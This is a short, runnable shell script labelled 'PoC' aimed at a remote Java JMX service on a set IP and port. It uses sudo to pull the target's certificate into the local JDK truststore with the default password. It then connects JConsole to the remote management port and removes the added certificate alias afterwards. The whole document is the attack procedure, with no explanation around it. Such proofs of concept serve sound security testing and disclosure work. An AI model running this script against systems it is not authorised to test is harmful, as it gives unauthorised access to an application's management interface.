target_ip=192.168.1.192
jmx_port=9091
truststore=/Library/Java/JavaVirtualMachines/jdk1.7.0_76.jdk/Contents/Home/jre/lib/security/cacerts
pass=changeit

echo "Starting PoC..."
echo "Target = $target_ip:$jmx_port"
echo "Truststore = $truststore"

printf "\nStep 1: Download Certificate(s)\n\n"
sudo java -jar DownloadCert.jar $target_ip $jmx_port $truststore $pass

printf "\nStep 2: Running JConsole\n"
jconsole $target_ip:$jmx_port -J-Djavax.net.ssl.trustStore=$truststore 

printf "\nStep 3: Clean up\n\n"
sudo keytool -delete -alias imc0 -keystore $truststore -storepass $pass

echo "Deleted alias 'imc0' from trust store."
